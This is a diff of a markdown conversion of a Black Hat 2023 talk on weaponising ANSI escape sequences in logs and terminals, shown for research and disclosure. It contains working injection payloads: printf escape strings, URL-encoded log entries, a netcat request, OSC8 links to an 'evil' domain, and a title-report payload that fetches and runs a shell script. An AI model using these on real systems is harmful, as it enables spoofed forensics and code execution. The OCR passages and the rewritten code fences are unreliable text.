@@ -8,18 +8,25 @@ year: 2023
 source_pdf: "Black Hat USA 2023 slides/STOK_Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare.pdf"
 pages: 150
 sha256: "0c35b624a2636f8f76b5f36b50cfa9974f7753bd6cb834aaa815ed678bc90fc7"
-text_chars: 65114
-ocr_pages: 52
+text_chars: 54575
+ocr_pages: 48
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 86.1
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:26:59Z"
+converted_at: "2026-08-12T04:25:09Z"
 ---
 # Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare
 
 **Speakers:** STOK  
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/STOK_Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare.pdf` (150 pages)
+
 
 ## Slide 1
 
@@ -45,7 +52,8 @@ converted_at: "2026-08-11T21:26:59Z"
 
 **POC OF A CREATIVE RANSOMWARE AD INSIDE A LOGFILE**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 stok@STOKs-MBP:~/Documents/logs yy
@@ -58,37 +66,25 @@ RESTORE 2
 Your Data is safe with us! 24H FAST RESTORE SERVICE ®!
 Need some help you do the math?, Here's a calculator ‘
 POC OF A CREATIVE RANSOMWARE AD INSIDE ALOGFILE
-.
 » logs cat everything. logo0$rm;open a calculator; shit
 cat: everything.logO0: No such file or directory .
-> logs PS$qul]
 ```
 
 ## Slide 7
 
 ###### **iTERM2 DOCKER VSCODE KITTY TERMINAL.APP WINDOWS TERMINAL GNOME VTE XTERM**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 75/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-© © © daeverDmces9p Ups or nest Q Search for local and remote mages, contarers. and more. La 2 8 sn @
-esr affectionate_chandrasekhar e ‘s0kBSTOKs-IMacBook-Pro:~/Documents
-<q ssinasertca.t svavus . —
 sameness eee Last Login: Tue Jul 11 09:13:03 on ttys01é
-& tropes 1 + Documents fj
-SB vores Inept
-$A Dev Emircemants ana
 TERMINAL zsh + D Leaming Cente
-; eat oe noe Da 1806 @
-BE rescue sos Swank tt sae te maces
-® Add ensrsions
 Recommendec Extension
 eee ~/Documents/terminal
 + terminal
 VS C O D E @ stok — stok@STOKs-MacBook-Pro
 KITTY
-= C\Windows\system32\cmd.e  X< +)
-B® Windows PowerShell = i:/+Shifi+1
 C:\Windows\System32>
 Command Prompt Ctri+Shift+2
 Me AureCloud Shell ——_crtastunss T E R M | N Al AP Pp
@@ -96,7 +92,6 @@ Me AureCloud Shell ——_crtastunss T E R M | N Al AP Pp
 Command Palette Curl+sie-?
 WINDOWS
 TERMINAL GNOME VTE
-Bubuntu-] ine
 ```
 
 ## Slide 8
@@ -105,11 +100,11 @@ Bubuntu-] ine
 
 **https://github.com/chjj/term.js https://github.com/xtermjs/xterm.js**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CLOUD CLI
-1-09690¢3297612a4f9 (conrect-hlog) | FC? Inctance Connect
 Droplet Console
 Ise sole for native-like terminal access to your Droalet from you
 5 for the new consol
@@ -118,7 +113,6 @@ Recovery Console
 you can't connec et with the Dropict
 ord authentication. if nec y, You can reset you
 Launch Recovery Console
-i-O889eCc3292613a4t9 (connect-blog)
 4.2)
 https://github.com/chjj/term.js
 https://github.com/xtermjs/xterm.js
@@ -130,7 +124,8 @@ https://github.com/xtermjs/xterm.js
 
 **https://invisible-island.net/xterm/ctlseqs/ctlseqs.html**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 8 invisible-island.net Bw
@@ -142,19 +137,7 @@ extends this to VT1@@.
 = CSI > Pp; Pv; Pee
 where Pp denotes the terminal type
 = "VT100".
-= "VT220",
 = "VT240" or "VT241".
-"VT330".
-"VT346".
-"VT320".
-"VT382".
-"VT426".
-"VT510".
-"VT520".
-"VT525".
-DADAWNHRPRPNEF ®
-UbPRPREN Pw OO
-BuUuULYU SG
 and Pv is the firmware version (for xterm, this was originally
 the XFree86 patch number, starting with 95). Ina DEC
 terminal, Pc indicates the ROM cartridge registration number
@@ -170,7 +153,6 @@ Later terminals (and xterm) do the same, for compatibility.
 Ps =®8 = Clear Current Column (default).
 Ps=3 = Clear All.
 Set Mode (SM).
-=> Nn
 ```
 
 ## Slide 10
@@ -181,11 +163,11 @@ Set Mode (SM).
 
 **XTERM**
 
-```
+\```
 CSI Pm m Character Attribute
 Ps = 3 2 -> Set foreground color to Green.
 Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007'
-```
+\```
 
 **https://invisible-island.net/xterm/ctlseqs/ctlseqs.html**
 
@@ -193,11 +175,11 @@ Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007'
 
 ##### **XTERM**
 
-```
+\```
 CSI Pm m Character Attribute
 Ps = 3 2 -> Set foreground color to Green.
 Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007'
-```
+\```
 
 **https://invisible-island.net/xterm/ctlseqs/ctlseqs.html**
 
@@ -205,12 +187,12 @@ Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007'
 
 ##### **XTERM**
 
-```
+\```
 CSI Pm m Character Attribute
 Ps = 3 2 -> Set foreground color to Green.
 Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007'
 Hello THIS IS GREEN
-```
+\```
 
 **https://invisible-island.net/xterm/ctlseqs/ctlseqs.html**
 
@@ -282,26 +264,26 @@ Hello THIS IS GREEN
 
 ##### **VIM**
 
-```
+\```
 vim badlog.log
 ~
 ~^[[31mESC-INJECTION:^[[32mSUCCESSFUL^[[0m^[
 ~
-```
+\```
 
 ## Slide 28
 
 ##### **VIM**
 
-```
+\```
 vim badlog.log
-```
+\```
 
-```
+\```
 ~
 ~^[[31mESC-INJECTION:^[[32mSUCCESSFUL^[[0m^[
 ~
-```
+\```
 
 ## Slide 29
 
@@ -312,12 +294,12 @@ vim badlog.log
 ~^[[31mESC-INJECTION:^[[32mSUCCESSFUL^[[0m^[
 ~
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 nano badlog.log
 Uw PICO 5.09 File: badlog. log
-AL [3lLmESC-INJECTION: 4[ [32mSUCCESSFUL“ [ [Om4[
 we Get Help @f@ WriteOut MIN Read Filegaf Prev Pg (IN Cut Text f@ Cur Pos
 wd Exit we) Justify i) Where is MAY Next Pg (J UnCut Text To Spell
 ```
@@ -326,13 +308,12 @@ wd Exit we) Justify i) Where is MAY Next Pg (J UnCut Text To Spell
 
 **\U001B**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-E > CG & view-source:https://terminalinjection.com/
 <html>
 <head>
-<title> *|[31mESC-INJECTION: * [32mSUCCESSFUL *![@m “| *|]1337;RequestAttention=fireworks *</title>
 </head>
 <body>
 <hl>This site Xontains non malicious ANSI Escape sequences</hi>
@@ -342,68 +323,66 @@ E > CG & view-source:https://terminalinjection.com/
 2
 3
 4
-Fy
 6
 7
 8
 9
-4)
 1
-RR
 ```
 
 ## Slide 31
 
 ##### **CAT**
 
-```
+\```
 > cat *.log
 ESC-INJECTION:SUCCESSFUL
 >
-```
+\```
 
 ## Slide 32
 
 ##### **GREP**
 
-```
+\```
 > grep INJEC -r ./
 .//badlog.log:ESC-INJECTION:SUCCESSFUL
 >
-```
+\```
 
 ## Slide 33
 
 ##### **TAIL**
 
-```
+\```
 > tail badlog.log
 ESC-INJECTION:SUCCESSFUL
 >
-```
+\```
 
 ## Slide 34
 
 ##### **AWK**
 
-```
+\```
 > awk '{print $1}' badlog.log
 ESC-INJECTION:SUCCESSFUL
 >
-```
+\```
 
 ## Slide 35
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 eee stok@STOKs-MacBook-Pro:~/Documents/terminal
-> terminal curl https: //terminalinjection. conf
 ```
 
 ## Slide 36
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 eee stok@STOKs-MacBook-Pro:~/Documents/terminal
@@ -423,17 +402,15 @@ eee stok@STOKs-MacBook-Pro:~/Documents/terminal
 
 **NSLOOKUP - SANITIZED ON OSX**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 0@e@ nslookup
 > terminal nslookup
 > set g=TXT
-> evil. terminaLlinjection.com
 Server: 198.18.11.221
-Address: 198.18.11.2212#53
 Non-authoritative answer:
-evil.terminalinjection.com text "\ \UOOLb[31mESC-INJECTION-UNICODE: \ \u@O1b[32mSUCCESSFUL\ \ud01Lb[Om\\ueo07"
 evil.terminalinjection.com text = "\027[32mESC-INJECTION-RAW: \027[31mSUCCESSFUL\027[Om\007"
 Authoritative answers can be found from:
 >|
@@ -443,7 +420,8 @@ Authoritative answers can be found from:
 
 > **NOT ON WINDOWS. BIGUPS TO DAVID!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY Windows PowerShell
@@ -458,7 +436,6 @@ Non-authoritative answer:
 evil.terminalinjection.com text =
 "ESC-INJECTION-RAW: SUCCESSFUL"
 evil.terminalinjection.com text =
-"\u001b[31mESC-INJECTION-UNICODE : \u001b[32mSUCCESSFUL\u001b[Om\u9007"
 > |
 ```
 
@@ -478,15 +455,15 @@ evil.terminalinjection.com text =
 
 **WHERE? LOG INJECTION!**
 
-```
+\```
 Printf ‘Hello \033[31mTHIS IS GREEN\033[0m\007'
 Hello THIS IS GREEN
-```
+\```
 
-```
+\```
 Printf ‘Hello \033[32mTHIS IS GREEN\033[0m\007’
 Hello THIS IS GREEN
-```
+\```
 
 ## Slide 43
 
@@ -502,7 +479,8 @@ Hello THIS IS GREEN
 
 **https://owasp.org/www-community/attacks/Log_Injection**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 HOW?
@@ -518,7 +496,8 @@ https://owasp.org/www-community/attacks/Log_Injection
 
 **https://owasp.org/www-community/attacks/Log_Injection**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 HOW?
@@ -533,92 +512,97 @@ https://owasp.org/www-community/attacks/Log_Injection
 
 **https://www.docker.com/blog/getting-started-with-docker-desktop/**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-© © © vecteroeton Updtea ites) [cSt ries eames irae cortnioe andlor C2PC)))
+[Docker Desktop window]
+Docker Desktop   Update to latest        Search for local and remote images, containers, and more...  ⌘K            Sign in
+Containers
+Images
+Volumes
+Dev Environments BETA
+Learning Center
+Extensions
+Resource usage
+Add Extensions
+
 affectionate_chandrasekhar
-® Containers < ® docker/getting-started STATUS
-2e0348d7fed4 O Running (0 seconds ago)
-@ images og
-@ Volumes Logs
-Inspect Terminal Files Stats
-—] Dev Environments (BETA 172.17.0.1 - - [16/Jul/2623:08:30:56 +0900] "GET /assets/stylesheets/application.adb8469c.css HTTP/1.1" 200 76332 "http://127.0.0.1/" "Mozilla/5.0 (Windows N’ Ir i)
-LeWebKit/537.35 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-" Q 0 (C) i
-2 Learning Center 172.17.0.1 - - [16/Jul/2623:08:30:56 +0900] "GET /assets/stylesheets/application-palette.a8b3c06d.css HTTP/1.1" 206 38773 “http://127.0.0.1/" “Mozilla/5.0 (Windows NT 10.0; Win64;
-x64) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
-172.17.0.1 - - [10/Jul/2623:08:30:56 +0900] "GET /tutorial/ HTTP/1.1" 200 14807 “http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, Like Gecko
-) Chrome/114.0.5735.199 Safari/537.36" "-"
-5 :
-extensions *  172,17.0.1 - - [10/Jul/2¢23:08:30:56 +0900] "GET /assets/fonts/font-awesome.css HITP/1.1" 200 30721 "http://127.0.0.1/" "Mozilla/S.@ (Windows NT 16.0; Win64; x64) AppleWebKit/537.3
-6 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
-wy Resource usage 172.17.0.1 - - [16/Jul/2623:08:30:56 +0900] "GET /images/docker-Labs-logo.svg HTTP/1.1" 200 6469 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit
-/537.36 (KHTML, Like Gecko) Chrome/114.9.5735.199 Safari/537.36" "-"
-3) Rd Extenstans 172,17.0.1 - - [16/Jul/2623:08:30:56 +0900] "GET /tutorial/tutorial-in-dashboard.png HTTP/1.1" 200 199860 "http://127.9.0.1/tutorial/" "Mozilla/5.@ (Windows NT 19.0; Win64; x64) Ap
-pleWebKit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
-172.17.0.1 - - [10/Jul/2623:08:30:56 +0900] "GET /assets/javascripts/application.c33a9706.js HTTP/1.1" 200 79589 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64;
-x64) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
-172.17.0.1 - - [16/Jul/2623:08:30:56 +0900] "GET /assets/fonts/specimen/MaterielIcons-Regular.woff2 HTTF/1.1" 200 44309 “http://127.0.0.1/assets/fonts/material-icons.css" "Mozilla/
-5.0 (Windows NT 16.0; Win64; x64) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
-172.17.0.1 [10/JuL/2623:08:30:56 10900] "GET /assets/fonts/specimen/FontAwesome.woff2 HTTP/1.1" 200 77160 "http://127.0.0.1/assets/fonts/font-awesome.css" "Mozilla/5.0 (Windows
-NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
-172.17.0.1 - - [16/Jul/2623:08:30:56 +0900] "GET /fonts/hinted-Geomanist-Book.ttf HTTP/1.1" 200 73568 "http://127.0.0.1/css/styles.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) A
-ppleWebKit/537.36 (KHTML, Like Gecko) Chrore/114.0.5735.199 Safari/537.36" "-" NV;
-RAM 5.53 GB CPU1.80% Disk 47.27 GB avail. of 58.37 GB + Not connected to Hub
-© v4.190 9
-@@eC Getting Started - Getting Stari xX = ++ v
-€ > X © 127.0.0.1/tutorial/
-Getting Started Table of contents
-The command you just ran
-The Docker Dashboard
-The command you just ran What is a container?
-Sharing our App What is a container image?
-Persisting our DB Congratulations! You have started the container for this tutorial! Let's first explain the command
-Using Bind Mounts that you just ran. In case you forgot, here's the command:
+< [icon] docker/getting-started
+2e0348d7fed4 [copy icon]
+80:80 [link icon]                                                    STATUS: Running (0 seconds ago)  [stop] [play] [restart] [delete]
+Logs   Inspect   Terminal   Files   Stats
+
+172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/stylesheets/application.adb8469c.css HTTP/1.1" 200 76332 "http://127.0.0.1/" "Mozilla/5.0 (Windows N[obscured by hover icons]leWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
+172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/stylesheets/application-palette.a8b3c06d.css HTTP/1.1" 200 38773 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
+172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /tutorial/ HTTP/1.1" 200 14807 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
+172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/fonts/font-awesome.css HTTP/1.1" 200 30721 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
+172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /images/docker-labs-logo.svg HTTP/1.1" 200 6469 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
+172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /tutorial/tutorial-in-dashboard.png HTTP/1.1" 200 109860 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
+172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/javascripts/application.c33a9706.js HTTP/1.1" 200 79589 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
+172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/fonts/specimen/MaterialIcons-Regular.woff2 HTTP/1.1" 200 44300 "http://127.0.0.1/assets/fonts/material-icons.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
+172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/fonts/specimen/FontAwesome.woff2 HTTP/1.1" 200 77160 "http://127.0.0.1/assets/fonts/font-awesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
+172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /fonts/hinted-Geomanist-Book.ttf HTTP/1.1" 200 73568 "http://127.0.0.1/css/styles.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
+
+RAM 5.53 GB   CPU 1.80%   Disk 47.27 GB avail. of 58.37 GB   Not connected to Hub                              v4.19.0
+
+[Browser window]
+Getting Started - Getting Starte  x   +
+127.0.0.1/tutorial/                                                          [flask icon] [square icon] Guest
+docker Labs   Getting Started                          Search                              docker/getting-started
+
+Getting Started                    Getting Started                          Table of contents
+Getting Started                                                              The command you just ran
+Our Application                                                              The Docker Dashboard
+Updating our App                    The command you just ran                 What is a container?
+Sharing our App                                                              What is a container image?
+Persisting our DB                   Congratulations! You have started the container for this tutorial! Let's first explain the command
+Using Bind Mounts                   that you just ran. In case you forgot, here's the command:
 Multi-Container Apps
-Using Docker Compose
-https://www.de
+Using Docker Compose                docker run -d -p 80:80 docker/getting-started
+
+https://www.docker.com/blog/getting-started-with-docker-desktop/
 ```
 
 ## Slide 48
 
 **DOCKER LOGS** `docker attach <containerid> docker logs --follow <containerid>`
 
-```
+\```
 Failed (2: No such file or directory), client: 172.17.0.1, server:
 localhost, request: "GET /tutorial/blah HTTP/1.1", host: "127.0.0.1"
 2023/07/13 10:50:56 [error] 21#21: *28 open() "/usr/share/nginx/html/
 tutorial/blah
-```
+\```
 
 ## Slide 49
 
-```
+\```
 printf '\033[31mESC-INJECTION:\033[32mSUCCESSFUL\033[0m\033'
-```
+\```
 
 ## Slide 50
 
 ##### **URL ENCODE**
 
-```
+\```
 printf '\033[31mESC-INJECTION:\033[32mSUCCESSFUL\033[0m\033'
 \n
-```
+\```
 
-```
+\```
 /%0a%1B%5B31mESC-INJECTION-LFURLENCODED:%1B%5B32mSUCCESSFUL%1B%5B0m%07%0a
-```
+\```
 
 ## Slide 51
 
 **URL ENCODE**
 
-```
+\```
 Printf '\033[31mTHIS IS RED:\033[32mTHIS IS GREEN\033[0m\007'
 THIS IS RED:THIS IS GREEN
 /%0a%1B%5B31mESC-INJECTION-LFURLENCODED:%1B%5B32mSUCCESSFUL%1B%5B0m%07%0a
-```
+\```
 
 ## Slide 52
 
@@ -632,7 +616,8 @@ THIS IS RED:THIS IS GREEN
 
 **https://marc.info/?l=bugtraq&m=104612710031920&q=p3**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 { Test Emulator Versions ]
@@ -652,8 +637,6 @@ hanterm-xf:
 6
 2
 (libzvt 2.0.1) [2.2 indirectly]
-NNWOWONS
-SehUPON:
 [ Vulnerability Index ]
 The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned CVE
 candidate namess for all issues described in this paper.
@@ -680,10 +663,10 @@ https
 
 ###### **2003 - H D MOORE**
 
-```
+\```
 OSC Ps ; Pt ST
 Ps = 2  ⇒  Change Window Title to Pt.
-```
+\```
 
 **https://marc.info/?l=bugtraq&m=104612710031920&q=p3**
 
@@ -693,21 +676,14 @@ Ps = 2  ⇒  Change Window Title to Pt.
 
 **https://marc.info/?l=bugtraq&m=104612710031920&q=p3**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-BY owned? x +h
-PS C:\Users\stok> mie-host "$([char]0x1b)]2; owned?$([char]6x07)"
-PS C:\Users\stok>
-```
-
 ## Slide 56
 
 ###### **2003 - H D MOORE**
 
 **https://marc.info/?l=bugtraq&m=104612710031920&q=p3**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY owned?
@@ -715,7 +691,6 @@ PS C:\Users\stok> write-host "$([char]0x1b) $C[cha
 PS C:\Users\stok>
 2003 - H D MOORE
 Sun
-tdetetetedteatete te teteaeaet
 https://marc.info/?l=bugtraq&m=104612710031920&q=p3
 Description
 de-iconify
@@ -753,18 +728,18 @@ icon Label
 
 ###### **2003 - H D MOORE**
 
-```
+\```
 CSI Ps t
 Ps = 21  ⇒ Report Windows Title
-```
+\```
 
 **https://marc.info/?l=bugtraq&m=104612710031920&q=p3**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Code Sun CDE XTerm Description
-oe en ------ +-----+-----+-------+---------------------------------
 csI it yes | yes yes de-iconify
 csI 2t yes | yes yes iconify
 cSsI3t yes | yes yes move window to pixel-position
@@ -802,14 +777,14 @@ osc L ST yes | yes yes set icon Label
 
 ###### **2003 - H D MOORE**
 
-```
+\```
 \033]2;;wget 127.0.0.1/.bd;sh .bd;exit;\007\033[21t\033]2;xterm\007Press Enter>\033[8m;
-```
+\```
 
-```
+\```
 CSI Ps t
 Ps = 21  ⇒ Report Windows Title
-```
+\```
 
 **https://marc.info/?l=bugtraq&m=104612710031920&q=p3**
 
@@ -825,10 +800,10 @@ Ps = 21  ⇒ Report Windows Title
 
 ###### **2010**
 
-```
+\```
 echo -en "GET /\x1b]2;\x07\x0a\x0d\x0a\x0d" > payload
 nc localhost 80 < payload
-```
+\```
 
 **NGINX, VARNISH, CHEROKEE, THTTPD, MINI-HTTPD, WEBRICK, ORION, AOLSERVER,YAWS AND BOA LOG ESCAPE SEQUENCE INJECTION - 2010-01-10**
 
@@ -860,7 +835,8 @@ FIXED!
 
 # **PROPRIETARY ESCAPE CODES**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PowerShell
@@ -870,8 +846,6 @@ Session -tcsh #2 just rang a bell!
 PRO TARY
 ESC ODES
 Archive: dum rip
-Co eratea me Unni password:
-extracting: dummy : . -
 99°21 [/tmn) Using iTerm2 v3's password manager. Cool]
 ```
 
@@ -903,14 +877,14 @@ extracting: dummy : . -
 
 **OSC8**
 
-```
+\```
 printf '\033]8;;http://example.com\033\\This is a link\033]8;;\033\\'
 This is a link
-```
+\```
 
-```
+\```
 Printf  '\033]8;;http://evil.terminalinjection.com\007'
-```
+\```
 
 ## Slide 71
 
@@ -920,27 +894,27 @@ Printf  '\033]8;;http://evil.terminalinjection.com\007'
 
 ### **OSC8 LINK ALL THE THINGS!**
 
-```
+\```
 printf  '\033]8;;http://evil.terminalinjection.com\007'
 ➜  logs ls -la
 total 912
 drwxr-xr-x@   3 stok  staff      96 Jul 10 12:40 .
 drwx------@ 169 stok  staff    5408 Jul 10 12:40 ..
 -rw-r--r--@   1 stok  staff  405305 Jul 10 13:32 everything.log
-```
+\```
 
 ## Slide 73
 
 **OSC8**
 
-```
+\```
 printf '\033]8;;http://example.com\033\\This is a link\033]8;;\033\\'
 This is a link
-```
+\```
 
-```
+\```
 Printf  '\033]8;;http://evil.terminalinjection.com\007'
-```
+\```
 
 ###### **SOME TERMINALS GENERATE WARNINGS, OTHERS DONT.**
 
@@ -952,38 +926,34 @@ Printf  '\033]8;;http://evil.terminalinjection.com\007'
 
 ##### **OSC8**
 
-```
+\```
 curl 127.0.0.1/hello%1b%5d8%3b%3bhttp%3a%2f%2fevil.terminalinjection.com%07
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ 404 Not Found x +
-<€7¢ @ 127.0.0.1/tutorial/updating-our-app/%1b%5d8%3b% Sbhttp%3a% 2f%2fevil.terminalinjection.com%07
 Do you want to navigate to http:/
 evil.terminalinjection.com?
 WARNING: This link could
 potentially be dangerous
 Cancel OK
 404 Not Found
-nginx/I
 ```
 
 ## Slide 76
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 > Volumes Logs Inspect Files Stats
-Dev Environme sh-4.4$ https://evil.terminalinjection.com https://evil.terminalinjection.com https: //evil.terminalinjection.com https://evil.terminalinjection.com https://evil.te i a Cc
 om https://evil.terminalinjection.com https://evil.terminalinjection.com https://evil.terminalinjection.com https://evil.terminalinjection.com https://evil.termineg Q O a it
-1 Learning Center tps: /fevil.terminalinjection.com https://evil.terminalinjection.com https://evil.terminalinjectisa<com https: //evil.terminalinjection.com https://evil.terminalinjection.com https: /
-fevil.terminalinjection.com https://evil.terminalinjection.com https://evil.terminalinjection.dom :/fevil.terminalinjection.com https: //evil.terminalinjection.corl |
 e
 Extensions
 " Resource u
-t3) 11337;RequestAttention=fireworks[. X ]1337;RequestAttention=fireworks[. * 11337;RequestAttention=fireworks{~ X +
 @ Add Extensic
 0 & htt, terminalinjection.com
 this is fine, trust me.
@@ -997,7 +967,8 @@ this is fine, trust me.
 
 **https://code.visualstudio.com/updates/v1_80**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Visual Studio Code Docs Updates Blog API Extensions FAQ Learn Pp + Downloac
@@ -1007,7 +978,6 @@ May 2023 Image support
 Images in the terminal, which were previewed last release, are now enabled by default. Images in a
 Workbench
 Editor
-April 2023 7 : ; ; ; a 7 . { Terminal
 terminal typically work by encoding the image pixel data as text, which is written to the terminal via a
 March 2023 Testing
 special escape sequence. The current protocols supported are sixel and the inline images protocol
@@ -1018,7 +988,6 @@ January 2023 To test images manually, you can download and cat a .six example fi
 Languages
 November 2022 10 TERMINAL Remote Development
 October 2022 Contr ons to extensions
-ctober 2) ~/Downloads
 » cat snake.six Preview Features
 September 2022
 Extension authoring
@@ -1027,7 +996,6 @@ Engineerin
 July 2022 $ 9
 Dacumentation
